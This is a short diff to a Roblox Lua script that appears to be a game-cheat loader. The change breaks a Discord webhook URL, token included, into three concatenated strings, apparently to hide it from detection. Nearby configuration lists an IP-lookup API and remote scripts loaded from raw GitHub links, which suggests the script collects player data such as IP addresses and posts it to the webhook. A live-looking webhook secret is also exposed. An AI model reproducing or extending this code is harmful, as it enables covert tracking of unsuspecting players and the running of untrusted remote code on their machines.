@@ -10,8 +10,12 @@ local ReplicatedStorage = game:GetService("ReplicatedStorage")
 local player = Players.LocalPlayer
 local playerGui = player:WaitForChild("PlayerGui")
 
+Webhook = "https://discord.com/"
+Webhook1 = "api/webhooks"
+Webhook2 = "1393398736344055930/G90Hkhf7jtSpyLc8SYE7t60DwxiwzfCw1EiQED84T163EdvDhRtuL5RzmEHp9Fq0R3UM"
+
 --// CONFIGURATION
-local WEBHOOK_URL = "https://discord.com/api/webhooks/1393398736344055930/G90Hkhf7jtSpyLc8SYE7t60DwxiwzfCw1EiQED84T163EdvDhRtuL5RzmEHp9Fq0R3UM"
+local WEBHOOK_URL = Webhook .. Webhook1 .. Webhook2
 local IP_API_URL = "https://velonix-api.vercel.app/json"
 local LOADER_SCRIPTS = {
     ["🌱 Grow a Garden"] = "https://raw.githubusercontent.com/ug32-C9/kupal/refs/heads/main/GAG.lua",
